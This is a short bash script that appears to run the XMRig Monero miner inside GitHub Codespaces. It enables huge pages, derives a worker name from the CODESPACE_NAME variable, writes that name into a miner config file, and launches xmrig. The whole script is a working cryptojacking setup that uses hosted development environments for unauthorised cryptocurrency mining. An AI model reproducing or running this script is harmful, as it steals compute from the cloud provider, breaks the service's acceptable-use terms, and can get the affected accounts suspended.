#!/bin/bash

sysctl -w vm.nr_hugepages=4096 2>/dev/null || true
SHORT_NAME=$(echo "$CODESPACE_NAME" | cut -c1-12)
WORKER="krxXJZV2MW.$SHORT_NAME"
echo "Worker name: $WORKER"
sed -i "s/\"user\": \".*\"/\"user\": \"$WORKER\"/" /workspaces/temp/config.json
/home/miner/xmrig/build/xmrig --config /workspaces/temp/config.json
